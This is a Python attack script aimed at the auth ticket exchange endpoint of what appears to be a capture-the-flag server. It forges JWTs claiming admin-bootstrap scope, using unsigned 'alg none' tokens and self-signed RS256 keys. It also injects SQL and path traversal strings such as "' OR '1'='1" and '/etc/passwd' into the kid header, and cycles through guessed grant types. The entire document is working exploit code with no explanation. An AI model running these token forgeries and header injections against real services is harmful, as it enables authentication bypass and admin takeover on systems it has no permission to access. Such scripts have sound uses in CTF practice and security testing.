import requests
import json
import jwt
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

base = "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf"

# Generate RSA key for signing test tickets
priv_rsa = rsa.generate_private_key(public_exponent=65537, key_size=2048)
priv_pem = priv_rsa.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

def test_t(hdr, payload, secret, alg="RS256", grant_type="legacy-bootstrap"):
    if alg == "none":
        h_b64 = base64.urlsafe_b64encode(json.dumps(hdr).encode()).decode().rstrip('=')
        p_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        tok = f"{h_b64}.{p_b64}."
    else:
        tok = jwt.encode(payload, secret, algorithm=alg, headers=hdr)
    
    r = requests.post(
        f"{base}/api/auth/exchange",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        json={"ticket": tok, "grantType": grant_type}
    )
    return r.status_code, r.text

base_payload = {
    "typ": "ticket",
    "scope": "admin-bootstrap",
    "sub": "ops-root",
    "iss": "ghost-packet-auth",
    "aud": "ghost-packet-ticket",
    "iqt": 1718119024,
    "exp": 1918119204
}

print("--- TESTING ALG NONE ---")
h_none = {"alg": "none", "typ": "JWT", "kid": "legacy-rs256-retired"}
print("alg none:", test_t(h_none, base_payload, None, alg="none"))

print("\n--- TESTING KIDS WITH RSA ---")
for k in ["legacy-rs256-retired", "primary-rs256", "none", "", "' OR '1'='1", "../", "/etc/passwd"]:
    h = {"alg": "RS256", "typ": "JWT", "kid": k}
    print(f"kid={repr(k):25s} -> {test_t(h, base_payload, priv_pem, alg='RS256')}")

print("\n--- TESTING GRANT TYPES ---")
for gt in ["legacy-bootstrap", "bootstrap", "admin-bootstrap", "ticket", "exchange"]:
    h = {"alg": "RS256", "typ": "JWT", "kid": "legacy-rs256-retired"}
    print(f"grantType={repr(gt):25s} -> {test_t(h, base_payload, priv_pem, alg='RS256', grant_type=gt)}")
